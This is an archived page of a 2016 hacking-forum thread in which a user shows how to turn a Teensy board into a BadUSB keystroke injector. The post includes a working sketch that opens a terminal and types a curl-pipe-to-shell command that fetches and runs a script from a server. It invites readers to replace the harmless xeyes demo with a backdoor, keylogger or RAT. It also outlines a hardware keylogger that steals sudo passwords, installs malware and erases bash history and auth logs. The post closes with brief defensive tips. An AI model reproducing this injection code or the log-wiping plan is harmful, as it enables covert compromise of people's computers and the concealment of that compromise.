<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Using a Teensy to Install Stuff in a Few Seconds - Hardware - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: 
You may have read the awesome ‚ÄúPlug In To Win‚Äù series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After so&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="1161.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="iFnJ4erueiqnOddilmpQLAE5v"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="iFnJ4erueiqnOddilmpQLAE5v"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Using a Teensy to Install Stuff in a Few Seconds&#39;" href="1161.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://d.clarkee.co.uk/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161" />
<meta property="og:title" content="Using a Teensy to Install Stuff in a Few Seconds" />
<meta name="twitter:title" content="Using a Teensy to Install Stuff in a Few Seconds" />
<meta property="og:description" content="Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]:  You may have read the awesome ‚ÄúPlug In To Win‚Äù series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alternative to this ‚Äúkeyboard injection‚Äù attacks. You may have already seen the code in the last part of @TheDoctor series‚Ä¶ this goes a bit more in detail.  In this paper I will describe how to reproduce..." />
<meta name="twitter:description" content="Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]:  You may have read the awesome ‚ÄúPlug In To Win‚Äù series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alternative to this ‚Äúkeyboard injection‚Äù attacks. You may have already seen the code in the last part of @TheDoctor series‚Ä¶ this goes a bit more in detail.  In this paper I will describe how to reproduce..." />
<meta property="og:article:section" content="Hardware" />
<meta property="og:article:section:color" content="CCFF31" />
<meta property="og:article:tag" content="badusb" />
<meta property="og:article:tag" content="keylogger" />
<meta property="og:article:tag" content="teensy" />
<meta property="og:article:tag" content="diy" />
<meta property="og:article:tag" content="hid" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="21 ‚ù§" />
<meta property="article:published_time" content="2016-10-03T16:57:28+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="1161.html">Using a Teensy to Install Stuff in a Few Seconds</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/hardware/68.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #CCFF31'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Hardware</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/badusb.html' class='discourse-tag' rel="tag">badusb</a>, 
            <a href='../../tag/keylogger.html' class='discourse-tag' rel="tag">keylogger</a>, 
            <a href='../../tag/teensy.html' class='discourse-tag' rel="tag">teensy</a>, 
            <a href='../../tag/diy.html' class='discourse-tag' rel="tag">diy</a>, 
            <a href='../../tag/hid.html' class='discourse-tag' rel="tag">hid</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Using a Teensy to Install Stuff in a Few Seconds'>
      <link itemprop='url' href='1161.html'>
      <meta itemprop='datePublished' content='2016-10-03T16:57:27Z'>
        <meta itemprop='articleSection' content='Hardware'>
      <meta itemprop='keywords' content='badusb, keylogger, teensy, diy, hid'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/0x00pf.html'><span itemprop='name'>0x00pf</span></a>
                (pico)
              </span>

                <link itemprop="mainEntityOfPage" href="1161.html">


              <span class="crawler-post-infos">
                  <time  datetime='2016-10-03T16:57:28Z' class='post-time'>
                    October 3, 2016,  4:57pm
                  </time>
                  <meta itemprop='dateModified' content='2016-10-03T17:09:21Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Continuing the discussion from <a href="../../../external.html?link=https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159" rel="noopener nofollow ugc">Plug In To Win - DIY Bad USB [Part 3/3]</a>:</p>
<p>You may have read the awesome ‚ÄúPlug In To Win‚Äù series from <a class="mention" href="../../u/thedoctor-2.html">@TheDoctor</a>. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alternative to this ‚Äúkeyboard injection‚Äù <em>attacks</em>. You may have already seen the code in the last part of <a class="mention" href="../../u/thedoctor-2.html">@TheDoctor</a> series‚Ä¶ this goes a bit more in detail.</p>
<p>In this paper I will describe how to reproduce the Rubber Ducky HID injection scenario using a small microcontroller board know as <a href="../../../external.html?link=https://www.pjrc.com/teensy/index.html" rel="noopener nofollow ugc">Teensy</a>. I‚Äôm using a Teensy 3.0 in this paper, but any other version should just work fine. The Teensy LC (Low Cost) cost around $12‚Ä¶ so it is a very affordable device.</p>
<p>Functionally, the Teensy works just like an Arduino, however, from its first versions, the Teensy included the capability to simulate USB HID devices. HID stands for <em>Human Interface Device</em> that is, keyboards, mouses and joysticks.</p>
<p>The easiest way to program the Teensy, is to install the <a href="../../../external.html?link=https://www.arduino.cc/en/Main/Software" rel="noopener nofollow ugc">Arduino IDE</a> and then upgrade it with the <a href="../../../external.html?link=https://www.pjrc.com/teensy/teensyduino.html" rel="noopener nofollow ugc">Teensyduino</a> package. This will give you access to a lot of Arduino enable libraries and allow you to get the most out of your little Teensy board. The installation uses a standard graphical wizard‚Ä¶ cannot be easier.</p>
<h1><a name="p-5537-test-environment-1" class="anchor" href="#p-5537-test-environment-1"></a>Test Environment</h1>
<p>For testing this PoC, we are going to use a local HTTP server able to serve some backdoor/malware SW. Same concept used on<a href="../../../external.html?link=https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154" rel="noopener nofollow ugc"> Part1</a> of <a class="mention" href="../../u/thedoctor-2.html">@TheDoctor</a>‚Äôs series. You can use your own server on the Internet if you want to. This local server solution will let you play with this idea even if you do not have a server on the Internet‚Ä¶</p>
<p>So this is how I did set it up:</p>
<pre><code class="lang-auto">$ cd /tmp
$ mkdir server
$ cd server
$ cat &lt;&lt; EOM &gt; b.sh
xeyes &amp;
EOM
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
</code></pre>
<p>Yep, this devastating malware launches <code>xeyes</code> and those little eyes will stare at you for the rest of the day‚Ä¶ That‚Äôs scary man!</p>
<p>In order to download and run the <code>b.sh</code> uber-malware we should run something like this:</p>
<p><code>$ curl -s http://127.0.0.1:8000/b.sh | /bin/sh</code></p>
<p>Change <code>b.sh</code> to suit your needs (install a backdoor, keylogger, RAT,‚Ä¶), and <code>127.0.0.1</code> to whatever server you want to use.</p>
<h1><a name="p-5537-the-teensy-script-2" class="anchor" href="#p-5537-the-teensy-script-2"></a>The Teensy Script</h1>
<p>The Teensy script is very simple. As with the USB Rubber Duck you have some functions to simulate different keys press and release events. In this script, we are assuming that the target machine is running the default Ubuntu Desktop. In this desktop, you can open a terminal by pressing <code>CTRL+ATL+T</code>. For other environments you may need to change the script‚Ä¶ Yep, this is just a PoC. You can close a terminal pressing <code>CTRL+D</code>‚Ä¶ so, knowing this, the script will look like this:</p>
<pre><code class="lang-auto">void release_keys (void)
{
 // Release all keys
  Keyboard.set_modifier (0);  
  Keyboard.send_now();
  delay (100);
}

void setup() {
  // put your setup code here, to run once:
  delay (1000);
  // Launch terminal (GNOME CTRL+ALT+t)
  Keyboard.set_modifier (MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  delay (100);
  
  Keyboard.press(KEY_T);
  Keyboard.release(KEY_T);
  delay (500); // Wait for the terminal to come up
  
  release_keys ();
 
  // Send Command
  Keyboard.println("curl -s http://127.0.0.1:8000/b.sh | /bin/sh");

  // Close terminal (CTRL+D)
  Keyboard.set_modifier (MODIFIERKEY_CTRL);
  Keyboard.send_now();
  delay (100);
  Keyboard.press(KEY_D);
  Keyboard.release(KEY_D);
  delay (100);
  release_keys ();
  
}
</code></pre>
<blockquote>
<p>You can find more details on how to use the teensy in <a href="../../../external.html?link=https://www.pjrc.com/teensy/td_keyboard.html" class="inline-onebox" rel="noopener nofollow ugc">Teensyduino: Using USB Keyboard with Teensy on the Arduino IDE</a></p>
</blockquote>
<p>I think the code is pretty straightforward to understand. However a couple of comments may help:</p>
<ul>
<li>The <code>CTRL</code>, <code>ALT</code>, <code>SHIFT</code>,‚Ä¶ keys are usually pressed together with other keys. These keys are usually known as modifiers and we can press many of them at the same time. So, we have to use the <code>set_modifier</code> method from  <code>Keyboard</code>, to activate and deactivate the use of those keys.</li>
<li>Note that, once a modifier key is activated, it will remain activated until we release it. That is what the <code>release_keys</code> function does‚Ä¶ we make it into a function because we have to call it at least twice in the code.</li>
<li>Finally, whenever you press a single key‚Ä¶ you also have to release it.</li>
</ul>
<p>This is it. Upload the sketch to the Teensy and then, whenever you plug it into a Ubuntu machine, it will bring up a Terminal Emulator, download and run some code form a remote server and then close the terminal. Of course, if the screen is locked then this system will just type funny user names and passwords.</p>
<h1><a name="p-5537-fine-tuning-3" class="anchor" href="#p-5537-fine-tuning-3"></a>Fine Tuning</h1>
<p>You may have noted different <code>delay</code> calls in the sketch. You may need to adjust them. The values in the script worked fine with may machine, but they are quite in the limit. You may need to increase them to safer values.</p>
<p>Some notes on the timing:</p>
<ul>
<li>The first delay accounts for the time it takes to the computer to identify the USB device, load the driver (if needed) and create the entry at <code>/dev/</code>. Depending on the computer and its load, this may happen immediately, or may take up to a few seconds.</li>
<li>Same happens with the Terminal. Usually you get a terminal immediately when you press <code>CTRL+ALT+T</code>. However, if the machine is heavy loaded, that may take also a few seconds. If the terminal is not there when we <em>type</em> our command in the next line‚Ä¶ then the command will just not be executed.</li>
<li>During the testing I noticed that, whenever I use individual keys I need to wait a bit before sending the next keystroke to the computer.</li>
</ul>
<p>As a rule of thumb‚Ä¶ try to mimic in your program the way you type in your computer‚Ä¶ that should work.</p>
<h1><a name="p-5537-jumping-into-real-world-4" class="anchor" href="#p-5537-jumping-into-real-world-4"></a>Jumping into Real World</h1>
<p>All this is very cool, but in real world things are not that easy. A decent user will lock its computer when s/he is away and will not use a privileged user account for normal work. This limits this attack to:</p>
<ul>
<li>being skilled enough to plug the device in the computer when the user is in front of you and also to keep the user sight away from the screen, so s/he will not notice the popping terminal in the screen.</li>
<li>do whatever is doable with a normal user account.</li>
</ul>
<p>So, you are, in best case, restricted to whatever you could do if you have got physical access to the machine. In a proper configured machine, that is not much.</p>
<p>In those case you have to go one step forward. I haven‚Äôt tried any of them, so I‚Äôm looking forward to you guys to implement them and report back in this thread.</p>
<h1><a name="p-5537-getting-a-ring-0-malware-installed-5" class="anchor" href="#p-5537-getting-a-ring-0-malware-installed-5"></a>Getting a Ring 0 Malware Installed</h1>
<p>In order to do this, you need to get Administrator access, either getting the Administrator password or running some local exploit. The local exploit scenario is pretty straightforward, just change <code>b.sh</code> for your exploit and run it. For getting the Administrator password we still have a couple of options:</p>
<ul>
<li>
<p>Make the <code>b.sh</code> a custom keylogger that will detect when the <code>sudo</code> command is entered and then it will capture the password. After that you have to instruct the external device to run a new script to install your software using <code>sudo</code> and the password it has just got. For that, we may need to configure the Teensy using a composite gadget driver making it behave as a keyboard and serial port at the same time.</p>
</li>
<li>
<p>Build a physical key logger that sits between the user keyboard and the computer. In this case the device will capture keystrokes waiting for a <code>sudo</code> command and grabbing the password (pretty much the same). Then it will inject the command afterwards‚Ä¶ for instance after some inactivity period.</p>
</li>
</ul>
<p>In general, the lock screen password is the same that the user password, that is the same that the <code>sudo</code> password. So, once the password is acquired, screen locked is no longer a problem.</p>
<h1><a name="p-5537-a-smart-hw-key-logger-6" class="anchor" href="#p-5537-a-smart-hw-key-logger-6"></a>A Smart HW Key Logger</h1>
<p>Let‚Äôs focus in the last case. Building a HW key logger that can inject Administrator commands based on some conditions. If I had to build such a thing I would:</p>
<ul>
<li>Grab one of those<a href="../../../external.html?link=http://www.acmesystems.it/arietta" rel="noopener nofollow ugc"> Arietta G25 boards</a>. It is damn small and has extra USB ports on addition to the USB OTG port we need to simulate the HID device.</li>
<li>Plug the system keyboard in one of the USB ports in the expansion header (this needs some basic soldering skills)</li>
<li>Plug the USB OTG (the microUSB connector) to the computer you want to sniff the keyboard</li>
<li>Configure the OTG port as a HID keyboard‚Ä¶ ideally mimicking the vendor/product ID from the original keyboard</li>
<li>Write a small program to capture the RAW keyboard events (probably just reading <code>/dev/input/whatever</code>) and then feed them into the HID device to effectively send the keyboard events to the computer.</li>
</ul>
<p>This small program will capture all key strokes, detect when a <code>sudo</code> command gets typed by the user, capture the <code>sudo</code> key‚Ä¶ wait until there is no keyboard activity for let‚Äôs say 10 minutes‚Ä¶ and then <em>type</em> the commands needed to install the malware.</p>
<p>The script should, in addition to installing whatever, clean up the bash history and also the system logs (at least <code>/var/log/auth</code> for Debian based systems) so the <code>sudo</code> command does not get noticed.</p>
<p>Anybody eager to try!.. please let me know if it works.</p>
<h1><a name="p-5537-protecting-yourself-7" class="anchor" href="#p-5537-protecting-yourself-7"></a>Protecting Yourself</h1>
<p>Protecting yourself against this kind of attack requires to take seriously physical security. If somebody can get to your computer and plug things in it without you noticing it‚Ä¶ well, they can do basically anything they want. And it is hard to detect.</p>
<p>For this specific kind of attack:</p>
<ul>
<li>Keep your USB ports visible so you will have more chances to notice if a HW keylogger is plugged in</li>
<li>Keep your computer in such a place that makes difficult the access to the USB ports.</li>
<li>Run some software that checks Vendor/Product ID for your keyboard. This can be faked, but the attacker has to figure it out</li>
<li>No not allow anybody to touch your computer‚Ä¶ specially if you are not around</li>
</ul>
<p>Despite of the obviously bad usages of this concept, this kind of devices may be very useful, specially to quickly do something on a server machine. Think about switching off a server that does not have a keyboard or screen. You may go and grab some in order to type <code>shutdown</code>, or you can program your little device with that command, plug it in and get the thing done in seconds. What about building a custom keyboard for your preferred game? ‚Ä¶ there are lots of useful and legit applications for a device that can simulate a USB HID!</p>
<p>Hack fun!</p>
<p><em>P.S.: You can do this same thing using an Arduino Leonardo, a BeagleBone Black, your Android phone or a Rpi Zero‚Ä¶ just to name a few</em></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="12" />
              <span class='post-likes'>12 Likes</span>
            </div>

                <div class='crawler-linkback-list' itemscope itemtype='../../../external.html?link=http://schema.org/ItemList'>
                      <div itemprop='itemListElement' itemscope itemtype='../../../external.html?link=http://schema.org/ListItem'>
                        <a itemprop='url' href="../../../external.html?link=https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159/22">Plug In To Win - DIY Bad USB [Part 3/3]</a>
                        <meta itemprop='position' content='8'>
                      </div>
                </div>

            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/SmartOne.html'><span itemprop='name'>SmartOne</span></a>
                (Not a N00b, but still learning)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-10-03T18:59:14Z' class='post-time'>
                    October 3, 2016,  6:59pm
                  </time>
                  <meta itemprop='dateModified' content='2016-10-03T18:59:14Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thanks for sharing the Arietta board, looks very nice! I also find <a href="../../../external.html?link=https://www.youtube.com/watch?v=Oplubg5q7ao" rel="nofollow noopener">this video</a> very interesting, because it shows the great possibilities of usb attacks! <img src="../../../0x00sec.org/images/emoji/twitter/grinc164.html?v=9" title=":grin:" class="emoji" alt=":grin:"> The <a href="../../../external.html?link=https://inversepath.com/usbarmory" rel="nofollow noopener">board used in the video</a> also seems great. All in all, as always a high quality article by <a class="mention" href="../../u/0x00pf.html">@0x00pf</a> <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/oaktree.html'><span itemprop='name'>oaktree</span></a>
                (oaktree)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2016-10-03T19:12:09Z' class='post-time'>
                    October 3, 2016,  7:12pm
                  </time>
                  <meta itemprop='dateModified' content='2016-10-03T19:12:09Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Just tried the same type of thing on an <a href="../../../external.html?link=https://www.arduino.cc/en/Main/ArduinoBoardLeonardo" rel="nofollow noopener">Arduino Leonardo</a>!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
